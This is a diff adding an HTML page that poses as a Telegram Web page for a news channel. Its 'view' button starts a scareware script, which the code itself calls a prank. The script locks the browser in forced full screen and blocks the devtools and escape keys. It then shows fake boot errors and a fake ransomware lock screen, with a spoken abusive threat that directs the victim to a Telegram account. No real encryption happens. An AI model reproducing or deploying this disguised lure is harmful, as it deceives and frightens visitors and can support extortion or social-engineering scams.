@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram: Contact @truxanews</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div id="fs-notice">site.com is now full screen (Press Esc to exit)</div>
+
+    <!-- Telegram Web -->
+    <div id="tg-wrapper">
+        <div class="tg-header">
+            <div class="tg-logo">
+                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.02-1.96 1.25-5.54 3.69-.52.36-1 .53-1.42.52-.47-.01-1.37-.26-2.03-.48-.82-.27-1.47-.42-1.42-.88.03-.24.38-.49 1.07-.75 4.19-1.82 6.99-3.02 8.4-3.61 4-.17 4.83 1.16 4.68 2.22z"/></svg>
+                <span>Telegram</span>
+            </div>
+            <button class="tg-dl-btn">DOWNLOAD</button>
+        </div>
+
+        <div class="tg-content">
+            <div class="tg-card">
+                <img src="https://i.ibb.co/W4wJ8h8B/photo.jpg" alt="Труха" class="tg-avatar-img">
+                <div class="tg-title-row">
+                    <span class="tg-title">Новини Труха</span>
+                    <svg class="verified-badge" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1.99 14.5l-3.5-3.5 1.41-1.41L10.01 13.67l5.59-5.59 1.41 1.41-7 7z"/></svg>
+                </div>
+                <div class="tg-username">@truxanews</div>
+                <div class="tg-subs">2.4M subscribers</div>
+                <button class="tg-main-btn" id="trigger-btn">VIEW IN TELEGRAM</button>
+                <div class="tg-preview" id="trigger-preview">Preview channel</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Загрузка Telegram (5 секунд) -->
+    <div id="tg-loader">
+        <div class="spinner"></div>
+        <div class="loader-text">Connecting to Telegram...</div>
+    </div>
+
+    <!-- Терминал с ошибками и глазом -->
+    <div id="terminal-screen">
+        <div class="boot-error">Boot error: 0x03527737</div>
+        <div class="boot-error">Boot error: 0x0266712</div>
+        <div class="boot-error">Boot error: 0x02897593</div>
+        
+        <div id="eye-container">
+            <svg viewBox="0 0 24 24">
+                <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+            </svg>
+            <div class="alert-text">ВАС ЗАМЕТИЛИ</div>
+        </div>
+    </div>
+
+    <!-- Красный экран со жнецом -->
+    <div id="death-screen">
+        <div class="death-art">
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢿⡀⠀⠀⠀⠀⣠⣶⣿⣷⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣦⣴⣿⡋⠀⠀⠈⢳⡄⠀⢠⣾⣿⠁⠈⣿⡆⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⠿⠛⠉⠉⠁⠀⠀⠀⠹⡄⣿⣿⣿⠀⠀⢹⡇⠀⠀⠀
+⠀⠀⠀⠀⠀⣠⣾⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⣰⣏⢻⣿⣿⡆⠀⠸⣿⠀⠀⠀
+⠀⠀⠀⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣆⠹⣿⣷⠀⢘⣿⠀⠀⠀
+⠀⠀⠀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⠋⠉⠛⠂⠹⠿⣲⣿⣿⣧⠀⠀
+⠀⢠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣿⣿⣿⣷⣾⣿⡇⢀⠀⣼⣿⣿⣿⣧⠀
+⠰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⡘⢿⣿⣿⣿⠀
+⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣷⡈⠿⢿⣿⡆
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠁⢙⠛⣿⣿⣿⣿⟟⠀⡿⠀⠀⢀⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣶⣤⣉⣛⠻⠇⢠⣿⣾⣿⡄⢻⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣦⣤⣾⣿⣿⣿⣿⣆⠁
+        </div>
+        <h1>ВАС ЗАМЕТИЛИ</h1>
+    </div>
+
+    <!-- Синий Винлокер -->
+    <div id="lock-screen">
+        <div class="lock-box">
+            <p style="text-align: center; font-size: 18px; margin-bottom: 12px;">Ваши файлы зашифрованы!</p>
+            <p>Упс! Ваш компьютер заблокирован, а все имеющиеся диски и файлы на них зашифрованы хакерской группировкой AQEMPERUIM. Любые попытки наебать систему нанесут непоправимый вред Вашему компьютеру и приведут к потере всех важных файлов без возможности восстановления. При попытке снять блокировку все ваши данные будут выгружены в сеть и будет подана рекурсивная нагрузка на ваш процессор, что приведет к его неисправности Уебок ты пиши <span style="color: #ff66ff;">@LuaRuntime</span> (Telegram)</p>
+            
+            <p style="text-align: center; margin-top: 15px; font-size: 16px;">Введите код разблокировки:</p>
+            <input type="text" class="lock-input" id="unlock-code" autocomplete="off">
+            
+            <div class="lock-footer">
+                <span>Current PC: 61E54C82-8DA0-4</span>
+                <span>Enter [Ввод]</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="ip-bar" id="ip-display" style="display: none;">IP: 18.472518E14182</div>
+
+    <script>
+        const tgWrapper = document.getElementById('tg-wrapper');
+        const tgLoader = document.getElementById('tg-loader');
+        const terminalScreen = document.getElementById('terminal-screen');
+        const eyeContainer = document.getElementById('eye-container');
+        const deathScreen = document.getElementById('death-screen');
+        const lockScreen = document.getElementById('lock-screen');
+        const ipDisplay = document.getElementById('ip-display');
+        const fsNotice = document.getElementById('fs-notice');
+
+        let started = false;
+
+        function playBeep(freq = 800, type = 'square', duration = 0.08) {
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioCtx.createOscillator();
+                const gainNode = audioCtx.createGain();
+                oscillator.type = type;
+                oscillator.frequency.value = freq; 
+                gainNode.gain.value = 0.05;
+                oscillator.connect(gainNode);
+                gainNode.connect(audioCtx.destination);
+                oscillator.start();
+                oscillator.stop(audioCtx.currentTime + duration);
+            } catch(e) {}
+        }
+
+        function speakThreat() {
+            window.speechSynthesis.cancel(); 
+            const text = `Упс! Ваш компьютер заблокирован, а все имеющиеся диски и файлы на них зашифрованы хакерской группировкой AQEMPERUIM. Любые попытки наебать систему нанесут непоправимый вред Вашему компьютеру и приведут к потере файлов. При попытке снять блокировку данные будут выгружены в сеть и будет подана нагрузка на процессор. Уебок ты пиши @LuaRuntime в телеграм.`;
+            
+            const utterance = new SpeechSynthesisUtterance(text);
+            utterance.lang = 'ru-RU';
+            utterance.rate = 2.8; 
+            utterance.pitch = 1.0; // Обычный нормальный низкий тон без писка
+            
+            const voices = window.speechSynthesis.getVoices();
+            const voice = voices.find(v => v.lang.includes('ru'));
+            if (voice) utterance.voice = voice;
+            
+            window.speechSynthesis.speak(utterance);
+        }
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'u') || e.key === 'Escape' || e.key === 'Tab' || e.altKey) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }
+        }, true);
+
+        document.addEventListener('contextmenu', e => e.preventDefault());
+
+        document.addEventListener('fullscreenchange', () => {
+            if (!document.fullscreenElement && started) {
+                document.documentElement.requestFullscreen().catch(() => {});
+            }
+        });
+
+        function startPrank() {
+            if (started) return;
+            started = true;
+
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen().catch(() => {});
+            }
+            fsNotice.style.display = 'block';
+
+            tgWrapper.style.display = 'none';
+            tgLoader.style.display = 'flex';
+
+            // Загрузка 5 секунд
+            setTimeout(() => {
+                tgLoader.style.display = 'none';
+                terminalScreen.style.display = 'block';
+                playBeep(700, 'square', 0.1);
+
+                // Появление глаза
+                setTimeout(() => {
+                    eyeContainer.style.display = 'block';
+                    playBeep(400, 'sawtooth', 0.15);
+
+                    // Переход на красный экран со жнецом (продолжительность всего 400мс, чтобы моментально пропадал)
+                    setTimeout(() => {
+                        eyeContainer.style.display = 'none';
+                        terminalScreen.style.display = 'none';
+                        deathScreen.style.display = 'flex';
+                        playBeep(200, 'sawtooth', 0.3);
+                        
+                        setTimeout(speakThreat, 300);
+
+                        // Моментальный уход со жнеца (через 400мс) на синий винлокер
+                        setTimeout(() => {
+                            deathScreen.style.display = 'none';
+                            lockScreen.style.display = 'flex';
+                            ipDisplay.style.display = 'block';
+                            document.getElementById('unlock-code').focus();
+                        }, 400);
+
+                    }, 1000);
+
+                }, 400);
+
+            }, 5000);
+        }
+
+        document.getElementById('trigger-btn').addEventListener('click', startPrank);
+        document.getElementById('trigger-preview').addEventListener('click', startPrank);
+        
+        window.speechSynthesis.onvoiceschanged = () => {
+            window.speechSynthesis.getVoices();
+        };
+    </script>
+</body>
+</html>
